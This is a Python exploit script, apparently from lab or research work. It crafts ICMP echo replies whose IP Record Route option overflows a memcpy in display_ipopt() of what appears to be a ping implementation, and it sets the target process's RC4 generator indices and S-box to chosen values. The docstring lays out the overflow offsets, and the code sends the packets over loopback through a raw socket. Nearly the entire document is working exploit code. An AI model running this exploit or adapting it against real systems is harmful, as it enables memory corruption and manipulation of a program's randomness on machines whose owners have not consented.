#!/usr/bin/env python3
"""Loopback-only crafted ICMP echo reply that sets the live RC4 indices.

Clang -O0 lays out random.c's hp_rand.i and hp_rand.j inside the 251-byte
span written by display_ipopt()'s memcpy(old_rr, cp, i):

    old_rr[0..39]      <- cp[0..39]
    hp_rand.i          <- old_rr+48  <- payload[2..5]   (little endian int)
    hp_rand.j          <- old_rr+52  <- payload[6..9]
    rc4_seedflag       <- old_rr+56  <- payload[10..13]
    rc4_sbox[0..186]   <- old_rr+64  <- payload[18..204]

No pinned source is edited.  Traffic stays on 127.0.0.2 -> 127.0.0.1 with an
AF_INET/IP_HDRINCL raw socket.
"""
import argparse
import socket
import struct
import time

from inject_rr import csum


def frame(pid, rr_len, ptr, i0, j0, seedflag, fill):
    ident = pid & 0xFFFF
    # payload[0..17]: marker, i0, j0, seedflag, marker
    lead = bytes([0xA0, 0xA1])
    lead += struct.pack("<i", i0)
    lead += struct.pack("<i", j0)
    lead += struct.pack("<i", seedflag)
    lead += bytes([0xB0, 0xB1, 0xB2, 0xB3])
    assert len(lead) == 18
    payload = lead + bytes([fill]) * 187
    icmp = struct.pack("!BBH", 0, 0, 0) + struct.pack("<H", ident) + struct.pack("<H", 0)
    icmp += payload
    opts = bytes([7, rr_len & 0xFF, ptr & 0xFF]) + bytes(range(0xA0, 0xA0 + 36)) + b"\0"
    assert len(opts) == 40
    total_len = 20 + len(opts) + len(icmp)
    ip = struct.pack("!BBHHHBBH4s4s", 0x4F, 0, total_len, 0x1234, 0, 64, 1, 0,
                     socket.inet_aton("127.0.0.2"), socket.inet_aton("127.0.0.1"))
    ip += opts
    ip = ip[:10] + struct.pack("!H", csum(ip)) + ip[12:]
    return ip + icmp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int, required=True)
    ap.add_argument("--rr-len", type=int, default=255)
    ap.add_argument("--ptr", type=int, default=255)
    ap.add_argument("--i0", type=int, default=0xE0)
    ap.add_argument("--j0", type=int, default=0xE1)
    ap.add_argument("--seedflag", type=int, default=1)
    ap.add_argument("--fill", type=int, default=0x20)
    ap.add_argument("--count", type=int, default=3)
    ap.add_argument("--gap", type=float, default=0.15)
    a = ap.parse_args()
    packet = frame(a.pid, a.rr_len, a.ptr, a.i0, a.j0, a.seedflag, a.fill)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        for _ in range(a.count):
            s.sendto(packet, ("127.0.0.1", 0))
            time.sleep(a.gap)
    finally:
        s.close()
    print("injected %d index-control frames: i0=0x%02x j0=0x%02x fill=0x%02x "
          "seedflag=%d pid=%d" % (a.count, a.i0, a.j0, a.fill, a.seedflag, a.pid))


if __name__ == "__main__":
    raise SystemExit(main())
